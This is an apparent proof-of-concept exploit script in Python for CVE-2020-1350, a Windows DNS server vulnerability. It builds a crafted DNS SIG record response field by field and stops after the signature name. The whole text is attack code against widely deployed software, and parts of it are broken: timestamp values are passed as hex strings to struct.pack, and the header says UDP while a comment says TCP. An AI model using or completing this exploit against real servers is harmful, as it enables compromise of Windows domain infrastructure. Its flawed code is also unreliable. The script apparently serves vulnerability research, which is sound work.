# CVE-2020-1350 Proof-of-Concept (UDP Response)
# Author: Connor McGarr (@33y0re)
# https://connormcgarr.github.io

import sys
import os
import socket
import struct
import time

# https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/
# https://tools.ietf.org/html/rfc2535#section-4.1

# Credit to @maxspl0it for research done on this!

# TCP server

# https://tools.ietf.org/html/rfc2535
tcp_response = "\x00\x01"		# Type covered (type of other RRs)
tcp_response += "\x00\x03"		# Algorithm (DSA is MANDATORY)
tcp_response += "\x00\x00"		# Labels (specifies root)
tcp_response += "\x00\x00\x00\x3a"	# TTL (same as other TTLs)

# https://www.lacnic.net/innovaportal/file/3135/1/dnssec_intro-mvergara.pdf
# Signature inception = 1 hour before current time
# Signature expiration = 30 minutes from now
# No easy way to convert YYYY-DD-MM-HH-MM-SS to Unix Timestap in Python 2
# Hardcoding w/ https://www.unixtimestamp.com/index.php
time_stamp_inception_placeholder = hex(1594969500)		# 2020-07-17 7:05:00 UTC
time_stamp_expiration_placeholder = hex(1594974900)		# 2020-07-17 8:35:00 UTC
tcp_response += struct.pack("!I", time_stamp_expiration_placeholder)	# Signature Expiration (!I sends as network bytes)
tcp_response += struct.pack("!I", time_stamp_inception_placeholder)		# Signature Inception
tcp_response += "\x00\x00"		# Key Tag (Isn't actually checked)
tcp_response += "\xc0\x0d"		# Signature Name (Thank you Checkpoint security advisory)
